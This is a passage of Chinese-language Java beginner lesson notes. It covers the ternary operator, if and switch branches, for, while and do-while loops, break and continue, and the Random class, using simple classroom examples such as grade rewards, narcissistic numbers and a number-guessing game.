三元运算符案例(应用)\r\n\r\n需求：\r\n\r\n​\t一座寺庙里住着三个和尚，已知他们的身高分别为150cm、210cm、165cm，请用程序实现获取这三个和尚的最高身高。\r\n\r\n~~~java\r\npublic class OperatorTest02 {\r\n\tpublic static void main(String[] args) {\r\n\t\t//1：定义三个变量用于保存和尚的身高，单位为cm，这里仅仅体现数值即可。\r\n\t\tint height1 = 150;\r\n\t\tint height2 = 210;\r\n\t\tint height3 = 165;\t\r\n\t\t//2：用三元运算符获取前两个和尚的较高身高值，并用临时身高变量保存起来。\r\n\t\tint tempHeight = height1 > height2 ? height1 : height2;\t\t\r\n\t\t//3：用三元运算符获取临时身高值和第三个和尚身高较高值，并用最大身高变量保存。\r\n\t\tint maxHeight = tempHeight > height3 ? tempHeight : height3;\t\r\n\t\t//4：输出结果\r\n\t\tSystem.out.println("maxHeight:" + maxHeight);\r\n\t}\r\n}\r\n~~~\r\n\r\n## 3. 流程控制语句\r\n\r\n在一个程序执行的过程中，各条语句的执行顺序对程序的结果是有直接影响的。所以，我们必须清楚每条语句的执行流程。而且，很多时候要通过控制语句的执行顺序来实现我们想要的功能。\r\n\r\n### 3.1 流程控制语句分类(了解)\r\n\r\n​\t顺序结构\r\n\r\n​\t分支结构(if, switch)\r\n\r\n​\t循环结构(for, while, do…while)\r\n\r\n### 3.2 顺序结构(了解)\r\n\r\n顺序结构是程序中最简单最基本的流程控制，没有特定的语法结构，按照代码的先后顺序，依次执行，程序中大多数的代码都是这样执行的。\r\n\r\n顺序结构执行流程图：\r\n\r\n![1545615769372](./img/java/basics/day02-Java基础语法.img/图片2.png)\r\n\r\n### 3.3 分支结构之if语句\r\n\r\n#### 3.3.1 if语句格式1（理解）\r\n\r\n~~~java\r\n格式：\r\nif (关系表达式) {\r\n    语句体;\t\r\n}\r\n~~~\r\n\r\n执行流程：\r\n\r\n①首先计算关系表达式的值\r\n\r\n②如果关系表达式的值为true就执行语句体\r\n\r\n③如果关系表达式的值为false就不执行语句体\r\n\r\n④继续执行后面的语句内容\r\n\r\n![1545616039363](./img/java/basics/day02-Java基础语法.img/图片3.png)\r\n\r\n示例：\r\n\r\n~~~java\r\npublic class IfDemo {\r\n\tpublic static void main(String[] args) {\r\n\t\tSystem.out.println("开始");\r\n        \r\n\t\t// 如果年龄大于18岁, 就可以上网吧\r\n\t\tint age = 17;\r\n\t\t\r\n\t\tif(age >= 18){\r\n\t\t\t// int a = 10;\r\n\t\t\tSystem.out.println("可以上网吧");\r\n\t\t}\r\n\t\t\t\r\n\t\tSystem.out.println("结束");\r\n\t}\r\n}\r\n~~~\r\n\r\n#### 3.3.2 if语句格式2（理解）\r\n\r\n~~~java\r\n格式：\r\nif (关系表达式) {\r\n    语句体1;\t\r\n} else {\r\n    语句体2;\t\r\n}\r\n~~~\r\n\r\n执行流程：\r\n\r\n①首先计算关系表达式的值\r\n\r\n②如果关系表达式的值为true就执行语句体1\r\n\r\n③如果关系表达式的值为false就执行语句体2\r\n\r\n④继续执行后面的语句内容\r\n\r\n![1545616221283](./img/java/basics/day02-Java基础语法.img/图片4.png)\r\n\r\n示例：奇偶数\r\n\r\n​\t任意给出一个整数，请用程序实现判断该整数是奇数还是偶数，并在控制台输出该整数是奇数还是偶数。\r\n\r\n~~~java\r\npublic class Demo2If {\r\n\tpublic static void main(String[] args) {\r\n\t\t// 程序判断一个数, 是奇数还是偶数\r\n\t\tint num = 9;\r\n\t\t\r\n\t\tif(num % 2 == 0){\r\n\t\t\tSystem.out.println("偶数");\r\n\t\t}else{\r\n\t\t\tSystem.out.println("奇数");\r\n\t\t}\r\n\t}\r\n}\r\n~~~\r\n\r\n#### 3.3.3 if语句格式3（理解）\r\n\r\n~~~java\r\n格式：\r\nif (关系表达式1) {\r\n    语句体1;\t\r\n} else if (关系表达式2) {\r\n    语句体2;\t\r\n} \r\n…\r\nelse {\r\n    语句体n+1;\r\n}\r\n~~~\r\n\r\n执行流程：\r\n\r\n①首先计算关系表达式1的值\r\n\r\n②如果值为true就执行语句体1；如果值为false就计算关系表达式2的值\r\n\r\n③如果值为true就执行语句体2；如果值为false就计算关系表达式3的值\r\n\r\n④…\r\n\r\n⑤如果没有任何关系表达式为true，就执行语句体n+1。\r\n\r\n![1545616667104](./img/java/basics/day02-Java基础语法.img/图片5.png)\r\n\r\n示例：\r\n\r\n​\t定义一个在0~100之间的变量a, 90~100优秀，80~89良好，70~79中等，60~69及格，0~59请努力加油！\r\n\r\n~~~java\r\npublic class Demo3If {\r\n\tpublic static void main(String[] args){\r\n\t\tint score = 65;\r\n\t\tif(score >= 90 && score <= 100){\r\n\t\t\tSystem.out.println("优秀");\r\n\t\t}else if (score >= 80 && score <= 89){\r\n\t\t\tSystem.out.println("良好");\r\n\t\t}else if (score >= 70 && score <= 79){\r\n\t\t\tSystem.out.println("中等");\r\n\t\t}else if (score >= 60 && score <= 69){\r\n\t\t\tSystem.out.println("及格");\r\n\t\t}else if (score >= 0 && score <= 59){\r\n\t\t\tSystem.out.println("请努力加油");\r\n\t\t}else{\r\n\t\t\tSystem.out.println("成绩有误!");\r\n\t\t}\r\n\t}\r\n}\r\n~~~\r\n\r\n#### 3.3.4 if语句格式3案例（应用）\r\n\r\n需求：小明快要期末考试了，小明爸爸对他说，会根据他不同的考试成绩，送他不同的礼物，假如你可以控制小明的得分，请用程序实现小明到底该获得什么样的礼物，并在控制台输出。\r\n\r\n分析：\r\n\r\n​\t①小明的考试成绩未知，可以使用键盘录入的方式获取值\r\n\r\n​\t②由于奖励种类较多，属于多种判断，采用if...else...if格式实现\r\n\r\n​\t③为每种判断设置对应的条件\r\n\r\n​\t④为每种判断设置对应的奖励\r\n\r\n~~~java\r\nimport java.util.Scanner;\r\npublic class IfTest02 {\r\n\tpublic static void main(String[] args){\r\n\t\t// 1. 使用Scanner录入考试成绩\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\tSystem.out.println("请输入您的成绩:");\r\n\t\tint score = sc.nextInt();\r\n\t\t// 2. 判断成绩是否在合法范围内 0~100\r\n\t\tif(score >=0 && score <= 100){\r\n\t\t\t// 合法成绩\r\n\t\t\t// 3. 在合法的语句块中判断成绩范围符合哪一个奖励\r\n\t\t\tif(score >= 95 && score <= 100){\r\n\t\t\t\tSystem.out.println("自行车一辆");\r\n\t\t\t}else if(score >= 90 && score <= 94){\r\n\t\t\t\tSystem.out.println("游乐场一次");\r\n\t\t\t}else if(score >= 80 && score <= 89){\r\n\t\t\t\tSystem.out.println("变形金刚一个");\r\n\t\t\t}else {\r\n\t\t\t\tSystem.out.println("挨顿揍, 这座城市又多了一个伤心的人~");\r\n\t\t\t}\r\n\t\t}else{\r\n\t\t\t// 非法的话, 给出错误提示\r\n\t\t\tSystem.out.println("您的成绩输入有误!");\r\n\t\t}\r\n\t}\r\n}\r\n~~~',S='## 1. switch语句\r\n\r\n### 1.1 分支语句switch语句\r\n\r\n* 格式\r\n\r\n  ```java\r\n  switch (表达式) {\r\n  \tcase 1:\r\n  \t\t语句体1;\r\n  \t\tbreak;\r\n  \tcase 2:\r\n  \t\t语句体2;\r\n  \t\tbreak;\r\n  \t...\r\n  \tdefault:\r\n  \t\t语句体n+1;\r\n  \t\tbreak;\r\n  }\r\n  ```\r\n\r\n* 执行流程：\r\n\r\n  * 首先计算出表达式的值 \r\n  * 其次，和case依次比较，一旦有对应的值，就会执行相应的语句，在执行的过程中，遇到break就会结 束。 \r\n  * 最后，如果所有的case都和表达式的值不匹配，就会执行default语句体部分，然后程序结束掉。 \r\n\r\n### 1.2 switch案例-减肥计划\r\n\r\n* 需求：键盘录入星期数，显示今天的减肥活动\r\n\r\n```\r\n周一：跑步  \r\n周二：游泳  \r\n周三：慢走  \r\n周四：动感单车\r\n周五：拳击  \r\n周六：爬山  \r\n周日：好好吃一顿 \r\n```\r\n\r\n* 示例代码：\r\n\r\n```java\r\npublic static void main(String[] args){\r\n\t\t// 1. 键盘录入星期数据，使用变量接收\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\tSystem.out.println("请输入");\r\n\t\tint week = sc.nextInt();\r\n\t\t// 2. 多情况判断，采用switch语句实现\r\n\t\tswitch(week){\r\n\t\t\t// 3. 在不同的case中，输出对应的减肥计划\r\n\t\t\tcase 1:\r\n\t\t\t\tSystem.out.println("跑步");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tSystem.out.println("游泳");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tSystem.out.println("慢走");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 4:\r\n\t\t\t\tSystem.out.println("动感单车");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 5:\r\n\t\t\t\tSystem.out.println("拳击");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 6:\r\n\t\t\t\tSystem.out.println("爬山");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 7:\r\n\t\t\t\tSystem.out.println("好好吃一顿");\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tSystem.out.println("您的输入有误");\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}\r\n```\r\n\r\n### 1.3 switch语句case穿透\r\n\r\n- 概述 : 如果switch语句中,case省略了break语句, 就会开始case穿透\r\n- 需求 : 键盘录入星期数，输出工作日、休息日 (1-5)工作日，(6-7)休息日\r\n- 示例代码：\r\n\r\n```java\r\n/*\r\ncase穿透是如何产生的?\r\n\t\t\r\n\t\t如果switch语句中,case省略了break语句, 就会开始case穿透.\r\n\t\t\r\n\t\t现象：\r\n\t\t\t当开始case穿透，后续的case就不会具有匹配效果，内部的语句都会执行\r\n\t\t\t直到看见break，或者将整体switch语句执行完毕，才会结束。\r\n*/\r\npublic static void main(String[] args){\r\n\t\tScanner sc = new Scanner(System.in);\r\n\t\tSystem.out.println("请输入星期数:");\r\n\t\tint week = sc.nextInt();\r\n\t\t\r\n\t\tswitch(week){\r\n\t\t\tcase 1:\r\n\t\t\tcase 2:\r\n\t\t\tcase 3:\r\n\t\t\tcase 4:\r\n\t\t\tcase 5:\r\n\t\t\t\tSystem.out.println("工作日");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 6:\r\n\t\t\tcase 7:\r\n\t\t\t\tSystem.out.println("休息日");\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tSystem.out.println("您的输入有误");\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t}\t\r\n}\r\n```\r\n## 2. for循环\r\n\r\n### 2.1 循环语句-for循环\r\n\r\n* 循环：\r\n\r\n  循环语句可以在满足循环条件的情况下，反复执行某一段代码，这段被重复执行的代码被称为循环体语句，当反复 执行这个循环体时，需要在合适的时候把循环判断条件修改为false，从而结束循环，否则循环将一直执行下去，形 成死循环。 \r\n\r\n* for循环格式：\r\n\r\n```java\r\nfor (初始化语句;条件判断语句;条件控制语句) {\r\n\t循环体语句;\r\n}\r\n```\r\n\r\n* 格式解释：\r\n\r\n  * 初始化语句：  用于表示循环开启时的起始状态，简单说就是循环开始的时候什么样\r\n  * 条件判断语句：用于表示循环反复执行的条件，简单说就是判断循环是否能一直执行下去\r\n  * 循环体语句：  用于表示循环反复执行的内容，简单说就是循环反复执行的事情\r\n  * 条件控制语句：用于表示循环执行中每次变化的内容，简单说就是控制循环是否能执行下去\r\n\r\n* 执行流程：\r\n\r\n  ①执行初始化语句\r\n\r\n  ②执行条件判断语句，看其结果是true还是false\r\n\r\n  ​             如果是false，循环结束\r\n\r\n  ​             如果是true，继续执行\r\n\r\n  ③执行循环体语句\r\n\r\n  ④执行条件控制语句\r\n\r\n  ⑤回到②继续\r\n\r\n### 2.2 for循环案例-输出数据1-5和5-1\r\n\r\n* 需求：在控制台输出1-5和5-1的数据 \r\n* 示例代码：\r\n\r\n```java\r\npublic class ForTest01 {\r\n    public static void main(String[] args) {\r\n\t\t//需求：输出数据1-5\r\n        for(int i=1; i<=5; i++) {\r\n\t\t\tSystem.out.println(i);\r\n\t\t}\r\n\t\tSystem.out.println("--------");\r\n\t\t//需求：输出数据5-1\r\n\t\tfor(int i=5; i>=1; i--) {\r\n\t\t\tSystem.out.println(i);\r\n\t\t}\r\n    }\r\n}\r\n```\r\n\r\n### 2.3 for循环案例-求1-5数据和\r\n\r\n* 需求：求1-5之间的数据和，并把求和结果在控制台输出 \r\n* 示例代码：\r\n\r\n```java\r\npublic class ForTest02 {\r\n    public static void main(String[] args) {\r\n\t\t//求和的最终结果必须保存起来，需要定义一个变量，用于保存求和的结果，初始值为0\r\n\t\tint sum = 0;\r\n\t\t//从1开始到5结束的数据，使用循环结构完成\r\n\t\tfor(int i=1; i<=5; i++) {\r\n\t\t\t//将反复进行的事情写入循环结构内部\r\n             // 此处反复进行的事情是将数据 i 加到用于保存最终求和的变量 sum 中\r\n\t\t\tsum += i;\r\n\t\t\t/*\r\n\t\t\t\tsum += i;\tsum = sum + i;\r\n\t\t\t\t第一次：sum = sum + i = 0 + 1 = 1;\r\n\t\t\t\t第二次：sum = sum + i = 1 + 2 = 3;\r\n\t\t\t\t第三次：sum = sum + i = 3 + 3 = 6;\r\n\t\t\t\t第四次：sum = sum + i = 6 + 4 = 10;\r\n\t\t\t\t第五次：sum = sum + i = 10 + 5 = 15;\r\n\t\t\t*/\r\n\t\t}\r\n\t\t//当循环执行完毕时，将最终数据打印出来\r\n\t\tSystem.out.println("1-5之间的数据和是：" + sum);\r\n    }\r\n}\r\n```\r\n\r\n* 本题要点：\r\n  * 今后遇到的需求中，如果带有求和二字，请立即联想到求和变量\r\n  * 求和变量的定义位置，必须在循环外部，如果在循环内部则计算出的数据将是错误的\r\n\r\n### 2.4 for循环案例-求1-100偶数和\r\n\r\n* 需求：求1-100之间的偶数和，并把求和结果在控制台输出 }\r\n* 示例代码：\r\n\r\n```java\r\npublic class ForTest03 {\r\n    public static void main(String[] args) {\r\n\t\t//求和的最终结果必须保存起来，需要定义一个变量，用于保存求和的结果，初始值为0\r\n\t\tint sum = 0;\r\n\t\t//对1-100的数据求和与1-5的数据求和几乎完全一样，仅仅是结束条件不同\r\n\t\tfor(int i=1; i<=100; i++) {\r\n\t\t\t//对1-100的偶数求和，需要对求和操作添加限制条件，判断是否是偶数\r\n\t\t\tif(i%2 == 0) {\r\n\t\t\t\tsum += i;\r\n\t\t\t}\r\n\t\t}\r\n\t\t//当循环执行完毕时，将最终数据打印出来\r\n\t\tSystem.out.println("1-100之间的偶数和是：" + sum);\r\n    }\r\n}\r\n```\r\n\r\n### 2.5 for循环案例-水仙花数\r\n\r\n* 需求：在控制台输出所有的“水仙花数” \r\n* 解释：什么是水仙花数？\r\n  * 水仙花数，指的是一个三位数，个位、十位、百位的数字立方和等于原数\r\n    * 例如`153  3*3*3 + 5*5*5 + 1*1*1 = 153`\r\n* 思路：\r\n  1. 获取所有的三位数，准备进行筛选，最小的三位数为100，最大的三位数为999，使用for循环获取\r\n  2. 获取每一个三位数的个位，十位，百位，做if语句判断是否是水仙花数\r\n* 示例代码\r\n\r\n```java\r\npublic class ForTest04 {\r\n    public static void main(String[] args) {\r\n\t\t//输出所有的水仙花数必然要使用到循环，遍历所有的三位数，三位数从100开始，到999结束\r\n\t\tfor(int i=100; i<1000; i++) {\r\n\t\t\t//在计算之前获取三位数中每个位上的值\r\n\t\t\tint ge = i%10;\r\n\t\t\tint shi = i/10%10;\r\n\t\t\tint bai = i/10/10%10;\r\n\t\t\t\r\n\t\t\t//判定条件是将三位数中的每个数值取出来，计算立方和后与原始数字比较是否相等\r\n\t\t\tif(ge*ge*ge + shi*shi*shi + bai*bai*bai == i) {\r\n\t\t\t\t//输出满足条件的数字就是水仙花数\r\n\t\t\t\tSystem.out.println(i);\r\n\t\t\t}\r\n\t\t}\r\n    }\r\n}\r\n```\r\n\r\n### 2.6 for循环案例-每行打印2个水仙花数(统计)\r\n\r\n* 需求：在控制台输出所有的“水仙花数”，要求每行打印2个\r\n* 示例代码：\r\n\r\n```java\r\npublic class Demo6For {\r\n\t/*\r\n\t\t需求：在控制台输出所有的“水仙花数”，要求每行打印2个\r\n\r\n\t\tSystem.out.print (打印内容);\t打印后不换行\r\n\t\tSystem.out.println(打印内容);\t打印后换行\r\n\r\n\t\t分析:\r\n\t\t\t\r\n\t\t\t1. 定义变量count，用于保存“打印过”的数量，初始值为0\r\n\t\t\t2. 在判定和打印水仙花数的过程中，拼接空格, 但不换行，并在打印后让count变量+1，记录打印过的数量\r\n\t\t\t3. 在每一次count变量+1后，判断是否到达了2的倍数，是的话，换行。\r\n\r\n\t*/\r\n\tpublic static void main(String[] args){\r\n\t\t// 1. 定义变量count，用于保存“打印过”的数量，初始值为0\r\n\t\tint count = 0;\r\n\t\tfor(int i = 100; i <= 999; i++){\r\n\t\t\tint ge = i % 10;\r\n\t\t\tint shi = i / 10 % 10;\r\n\t\t\tint bai = i / 10 / 10 % 10;\r\n\t\t\t\r\n\t\t\tif(\t(ge*ge*ge + shi*shi*shi + bai*bai*bai) == i){\r\n\t\t\t\t//  2. 在判定和打印水仙花数的过程中，拼接空格, 但不换行，并在打印后让count变量+1，记录打印过的数量\r\n\t\t\t\tSystem.out.print(i + " ");\r\n\t\t\t\tcount++;\r\n\t\t\t\t// 3. 在每一次count变量+1后，判断是否到达了2的倍数，是的话，换行\r\n\t\t\t\tif(count % 2 == 0){\r\n\t\t\t\t\tSystem.out.println();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n```\r\n\r\n* 本题要点：\r\n  * 今后如果需求带有统计xxx，请先想到计数器变量\r\n  * 计数器变量定义的位置，必须在循环外部\r\n\r\n## 3. while循环\r\n\r\n### 3.1 循环语句-while循环\r\n\r\n* while循环完整格式：\r\n\r\n  ```java\r\n  初始化语句;\r\n  while (条件判断语句) {\r\n  \t循环体语句;\r\n      条件控制语句;\r\n  }\r\n  ```\r\n\r\n* while循环执行流程：\r\n\r\n  ①执行初始化语句\r\n\r\n  ②执行条件判断语句，看其结果是true还是false\r\n\r\n  ​             如果是false，循环结束\r\n\r\n  ​             如果是true，继续执行\r\n\r\n  ③执行循环体语句\r\n\r\n  ④执行条件控制语句\r\n\r\n  ⑤回到②继续\r\n\r\n* 示例代码：\r\n\r\n```java\r\npublic class WhileDemo {\r\n    public static void main(String[] args) {\r\n        //需求：在控制台输出5次"HelloWorld"\r\n\t\t//for循环实现\r\n\t\tfor(int i=1; i<=5; i++) {\r\n\t\t\tSystem.out.println("HelloWorld");\r\n\t\t}\r\n\t\tSystem.out.println("--------");\r\n\t\t//while循环实现\r\n\t\tint j = 1;\r\n\t\twhile(j<=5) {\r\n\t\t\tSystem.out.println("HelloWorld");\r\n\t\t\tj++;\r\n\t\t}\r\n    }\r\n}\r\n```\r\n\r\n### 3.2 while循环案例-珠穆朗玛峰\r\n\r\n* 需求：世界最高山峰是珠穆朗玛峰(8844.43米=8844430毫米)，假如我有一张足够大的纸，它的厚度是0.1毫米。请问，我折叠多少次，可以折成珠穆朗玛峰的高度?\r\n* 示例代码：\r\n\r\n```java\r\npublic class WhileTest {\r\n    public static void main(String[] args) {\r\n\t\t//定义一个计数器，初始值为0\r\n\t\tint count = 0;\r\n\t\t//定义纸张厚度\r\n\t\tdouble paper = 0.1;\r\n\t\t//定义珠穆朗玛峰的高度\r\n\t\tint zf = 8844430;\r\n\t\t//因为要反复折叠，所以要使用循环，但是不知道折叠多少次，这种情况下更适合使用while循环\r\n\t\t//折叠的过程中当纸张厚度大于珠峰就停止了，因此继续执行的要求是纸张厚度小于珠峰高度\r\n\t\twhile(paper <= zf) {\r\n\t\t\t//循环的执行过程中每次纸张折叠，纸张的厚度要加倍\r\n\t\t\tpaper *= 2;\r\n\t\t\t//在循环中执行累加，对应折叠了多少次\r\n\t\t\tcount++;\r\n\t\t}\r\n\t\t//打印计数器的值\r\n\t\tSystem.out.println("需要折叠：" + count + "次");\r\n    }\r\n}\r\n```\r\n\r\n## 4. 循环细节\r\n\r\n### 4.1 循环语句-dowhile循环\r\n\r\n* 完整格式：\r\n\r\n  ```java\r\n  初始化语句;\r\n  do {\r\n  \t循环体语句;\r\n  \t条件控制语句;\r\n  }while(条件判断语句);\r\n  ```\r\n\r\n* 执行流程：\r\n\r\n  ① 执行初始化语句\r\n\r\n  ② 执行循环体语句\r\n\r\n  ③ 执行条件控制语句\r\n\r\n  ④ 执行条件判断语句，看其结果是true还是false\r\n\r\n  如果是false，循环结束\r\n\r\n  如果是true，继续执行\r\n\r\n  ⑤ 回到②继续\r\n\r\n* 示例代码：\r\n\r\n```java\r\npublic class DoWhileDemo {\r\n    public static void main(String[] args) {\r\n        //需求：在控制台输出5次"HelloWorld"\r\n\t\t//for循环实现\r\n\t\tfor(int i=1; i<=5; i++) {\r\n\t\t\tSystem.out.println("HelloWorld");\r\n\t\t}\r\n\t\tSystem.out.println("--------");\r\n\t\t//do...while循环实现\r\n\t\tint j = 1;\r\n\t\tdo {\r\n\t\t\tSystem.out.println("HelloWorld");\r\n\t\t\tj++;\r\n\t\t}while(j<=5);\r\n    }\r\n}\r\n```\r\n\r\n### 4.2 三种循环的区别\r\n\r\n* 三种循环的区别\r\n  * for循环和while循环先判断条件是否成立，然后决定是否执行循环体（先判断后执行）\r\n  * do...while循环先执行一次循环体，然后判断条件是否成立，是否继续执行循环体（先执行后判断）\r\n* for循环和while的区别\r\n  * 条件控制语句所控制的自增变量，因为归属for循环的语法结构中，在for循环结束后，就不能再次被访问到了\r\n  * 条件控制语句所控制的自增变量，对于while循环来说不归属其语法结构中，在while循环结束后，该变量还可以继续使用\r\n* 死循环（无限循环）的三种格式\r\n  1. for(;;){}\r\n  2. while(true){}\r\n  3. do {} while(true);\r\n\r\n### 4.3 死循环\r\n\r\n- 死循环格式\t\t\r\n\r\n  ```\r\n  for死循环格式 :\r\n  for(;;){\r\n  \r\n  }\r\n  \r\n  while死循环格式 :\r\n  \r\n  while(true){\r\n  \r\n  }\r\n  \r\n  do..while死循环格式 :\r\n  \r\n  do{\r\n  \r\n  }while(true);\r\n  ```\r\n\r\n- 死循环案例\r\n\r\n```java\r\n/*\r\n\t问题: 死循环有应用场景吗?\r\n\t\t\r\n\t\t\t\t例如: 键盘录入一个1-100之间的整数\r\n\t\t\t\t\r\n\t\t\t\t顾虑: 键盘录入是用户操作的, 用户就可能会出现一些误操作的现象\r\n\t\t\r\n*/\r\npublic static void main(String[] args) {\r\n    /*\r\n\t\tfor(;;){\r\n\t\t\tSystem.out.println("我停不下来了~");\r\n\t\t}\r\n\t\t*/\r\n\r\n    /*\r\n\t\twhile(true){\r\n\t\t\tSystem.out.println("我停不下来了~");\r\n\t\t}\r\n\t\t*/\r\n\r\n    do{\r\n        System.out.println("我停不下来了~");\t\r\n    }while(true);\r\n\r\n    System.out.println("看看我能被执行吗?~");\t// 无法访问的语句\r\n}\r\n}\r\n```\r\n\r\n\r\n\r\n### 4.4 跳转控制语句\r\n\r\n* 跳转控制语句（break）\r\n  * 跳出循环，结束循环\r\n* 跳转控制语句（continue）\r\n  * 跳过本次循环，继续下次循环\r\n* 注意： continue只能在循环中进行使用！\r\n\r\n```java\r\npublic class Demo1Continue {\r\n\t/*\r\n\t\tcontinue : 跳过某次循环体内容的执行\r\n\t\t\r\n\t\t注意：使用是基于条件控制, 在循环内部使用.\r\n\t\t\r\n\t\t需求: 模拟电梯上行的过程 1-24层, 4层不停.\r\n\t*/\r\n\tpublic static void main(String[] args){\r\n\t\tfor(int i = 1; i <= 24; i++){\r\n\t\t\tif(i == 4){\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tSystem.out.println(i + "层到了~");\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n```\r\n\r\n```java\r\npublic class Demo2Break {\r\n\t/*\r\n\t\tbreak : 终止循环体内容的执行\r\n\t\t注意：使用是基于条件控制的\r\n\t\t\t\tbreak语句只能在循环和switch中进行使用.\r\n\t\t\t\t\r\n\t\t需求: 模拟20岁工作到80岁, 60岁退休.\r\n\t*/\r\n\tpublic static void main(String[] args){\r\n\t\tfor(int i = 20; i <= 80; i++){\r\n\t\t\tif(i == 60){\r\n\t\t\t\tbreak;\t\t// 结束整个循环\r\n\t\t\t}\r\n\t\t\tSystem.out.println(i + "岁正在上班");\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n```\r\n\r\n```java\r\nimport java.util.Scanner;\r\n\r\npublic class Test {\r\n\t/*\r\n\t\t需求：程序运行后，用户可多次查询星期对应的减肥计划，直到输入0，程序结束\r\n\t\t\r\n\t\t步骤:\r\n\t\t\t\r\n\t\t\t1. 不明确用户操作几次, 使用死循环包裹业务逻辑\r\n\t\t\t2. 匹配到0的时候，使用break结束循环死循环\r\n\r\n\t*/\r\n\tpublic static void main (String[] args){\r\n\t\t\r\n\t\tlo:while(true){\r\n\t\t\tSystem.out.println("请输入您要查看的星期数:");\r\n\t\t\tSystem.out.println("(如无需继续查看,请输入0退出程序)");\r\n\t\t\t\r\n\t\t\t// 1. 键盘录入星期数据，使用变量接收\r\n\t\t\tScanner sc = new Scanner(System.in);\r\n\t\t\tint week = sc.nextInt();\r\n\t\t\t// 2. 多情况判断，采用switch语句实现\r\n\t\t\tswitch(week){\r\n\t\t\t\t// 3. 在不同的case中，输出对应的减肥计划\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tSystem.out.println("感谢您的使用");\r\n\t\t\t\t\tbreak lo;\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tSystem.out.println("跑步");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tSystem.out.println("游泳");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tSystem.out.println("慢走");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\tSystem.out.println("动感单车");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 5:\r\n\t\t\t\t\tSystem.out.println("拳击");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 6:\r\n\t\t\t\t\tSystem.out.println("爬山");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 7:\r\n\t\t\t\t\tSystem.out.println("好好吃一顿");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tdefault:\r\n\t\t\t\t\tSystem.out.println("您的输入有误");\r\n\t\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t}\r\n}\r\n```\r\n\r\n\r\n\r\n## 5. Random\r\n\r\n### 5.1 Random产生随机数（掌握）\r\n\r\n* 概述：\r\n\r\n  * Random类似Scanner，也是Java提供好的API，内部提供了产生随机数的功能\r\n    * API后续课程详细讲解，现在可以简单理解为Java已经写好的代码\r\n\r\n* 使用步骤：\r\n\r\n  1. 导入包\r\n\r\n     import java.util.Random;\r\n\r\n  2. 创建对象\r\n\r\n     Random r = new Random();\r\n\r\n  3. 产生随机数\r\n\r\n     int num = r.nextInt(10);\r\n\r\n     解释： 10代表的是一个范围，如果括号写10，产生的随机数就是0-9，括号写20，参数的随机数则是0-19\r\n\r\n* 示例代码：\r\n\r\n```java\r\nimport java.util.Random;\r\n\r\npublic class Demo1Random {\r\n\t/*\r\n\t\tRandom : 产生随机数\r\n\t\t\r\n\t\t1. 导包\t: import java.util.Random;\r\n\t\t\t\t    导包的动作必须出现在类定义的上面\r\n\r\n\t\t2. 创建对象 : Random r = new Random();\r\n\t\t\t\t\t上面这个格式里面，r 是变量名，可以变，其他的都不允许变\r\n\r\n\t\t3. 获取随机数 : int number = r.nextInt(10);\t//获取数据的范围：[0,10) 包括0,不包括10\r\n\t\t\t\t\t上面这个格式里面，number是变量名，可以变，数字10可以变。其他的都不允许变\r\n\t\t\r\n\t\t需求: 产生随机数1-10之间的\r\n\t*/\r\n\tpublic static void main(String[] args){\r\n\t\t// 2. 创建对象\r\n\t\tRandom r = new Random();\r\n\t\t\r\n\t\tfor(int i = 1; i <= 10; i++){\r\n\t\t\t// 3. 获取随机数\r\n\t\t\tint num = r.nextInt(10) + 1;\t\t// 1-10\r\n\t\t\tSystem.out.println(num);\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t}\r\n}\r\n```\r\n\r\n### 5.3 Random练习-猜数字（应用）\r\n\r\n* 需求：\r\n\r\n  程序自动生成一个1-100之间的数字，使用程序实现猜出这个数字是多少？\r\n\r\n  当猜错的时候根据不同情况给出相应的提示\r\n\r\n  A. 如果猜的数字比真实数字大，提示你猜的数据大了\r\n\r\n  B. 如果猜的数字比真实数字小，提示你猜的数据小了\r\n\r\n  C. 如果猜的数字与真实数字相等，提示恭喜你猜中了\r\n\r\n* 示例代码：\r\n\r\n```java\r\nimport java.util.Scanner;\r\nimport java.util.Random;\r\n\r\npublic class Test {\r\n\t/*\r\n\t\t需求：程序自动生成一个1-100之间的数字，使用程序实现猜出这个数字是多少？\r\n\t\t\t当猜错的时候根据不同情况给出相应的提示\r\n\t\t\t如果猜的数字比真实数字大，提示你猜的数据大了\r\n\t\t\t如果猜的数字比真实数字小，提示你猜的数据小了\r\n\t\t\t如果猜的数字与真实数字相等，提示恭喜你猜中了\r\n\t\t\r\n\t\t1. 准备Random和Scanner对象, 分别用于产生随机数和键盘录入\r\n\t\t2. 使用Random产生一个1-100之间的数, 作为要猜的数\r\n\t\t3. 键盘录入用户猜的的数据\r\n\t\t4. 使用录入的数据(用户猜的数据)和随机数(要猜的数据)进行比较, 并给出提示\r\n\t\t\r\n\t\t5. 以上内容需要多次进行, 但无法预估用户输入几次可以猜测正确, 使用while(true)死循环包裹\r\n\t\t6. 猜对之后, 